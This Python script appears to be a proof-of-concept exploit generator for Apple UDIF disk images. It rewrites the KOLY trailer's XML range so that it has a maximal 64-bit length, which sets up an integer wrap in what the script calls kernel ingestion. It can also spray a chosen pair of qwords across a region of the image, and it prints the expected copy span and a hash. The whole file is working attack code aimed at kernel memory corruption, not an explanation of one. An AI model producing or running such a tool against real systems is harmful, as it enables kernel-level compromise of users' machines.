#!/usr/bin/env python3
"""Patch a validated UDIF vnode before kernel selector-0 ingestion."""

from __future__ import annotations

import argparse
import hashlib
import os
import struct
from pathlib import Path


KOLY_SIZE = 512
XML_RANGE_FIELD = 0xD8
MAX_U64 = 0xFFFFFFFFFFFFFFFF


def parse_int(value: str) -> int:
    return int(value, 0)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("image", type=Path)
    parser.add_argument("xml_offset", type=parse_int)
    parser.add_argument("--patch-offset", type=parse_int)
    parser.add_argument("--patch-span", type=parse_int)
    parser.add_argument("--patch-qword0", type=parse_int, default=0)
    parser.add_argument("--patch-qword1", type=parse_int)
    args = parser.parse_args()

    patch_values = (args.patch_offset, args.patch_span, args.patch_qword1)
    if any(value is not None for value in patch_values) and not all(
        value is not None for value in patch_values
    ):
        parser.error(
            "--patch-offset, --patch-span, and --patch-qword1 are required together"
        )
    if not 0 <= args.xml_offset <= MAX_U64:
        parser.error("xml_offset must fit in uint64")

    with args.image.open("r+b", buffering=0) as image:
        size = os.fstat(image.fileno()).st_size
        if size < KOLY_SIZE:
            raise ValueError("image is smaller than a UDIF trailer")
        trailer = size - KOLY_SIZE
        image.seek(trailer)
        if image.read(4) != b"koly":
            raise ValueError("image does not end in a KOLY trailer")
        if args.xml_offset > size:
            raise ValueError("xml_offset must not exceed EOF")

        image.seek(trailer + XML_RANGE_FIELD)
        old_pair = image.read(16)
        if len(old_pair) != 16:
            raise ValueError("short read of KOLY XML range")

        old_prefix = None
        if args.patch_offset is not None:
            if args.patch_span < 16 or args.patch_span % 16:
                raise ValueError("patch span must be a positive multiple of 16")
            if args.patch_offset < 0 or args.patch_offset + args.patch_span > trailer:
                raise ValueError("pattern patch must stay before the KOLY trailer")
            pair = struct.pack(
                "<QQ", args.patch_qword0, args.patch_qword1
            )
            image.seek(args.patch_offset)
            old_prefix = image.read(16)
            image.seek(args.patch_offset)
            image.write(pair * (args.patch_span // 16))

        image.seek(trailer + XML_RANGE_FIELD)
        image.write(struct.pack(">QQ", args.xml_offset, MAX_U64))
        os.fsync(image.fileno())

    digest = hashlib.sha256(args.image.read_bytes()).hexdigest()
    old_offset, old_length = struct.unpack(">QQ", old_pair)
    print(
        f"UDIF_BOUNDED_WRAP_PATCHED image={args.image} size=0x{size:x} "
        f"trailer=0x{trailer:x} old_xml_offset=0x{old_offset:x} "
        f"old_xml_length=0x{old_length:x} "
        f"new_xml_offset=0x{args.xml_offset:x} "
        f"new_xml_length=0xffffffffffffffff "
        f"expected_copy_span=0x{size - args.xml_offset:x} sha256={digest}",
        flush=True,
    )
    if args.patch_offset is not None:
        print(
            f"UDIF_PATTERN_PATCHED offset=0x{args.patch_offset:x} "
            f"span=0x{args.patch_span:x} qword0=0x{args.patch_qword0:x} "
            f"qword1=0x{args.patch_qword1:x} "
            f"old_prefix={old_prefix.hex()}",
            flush=True,
        )


if __name__ == "__main__":
    main()
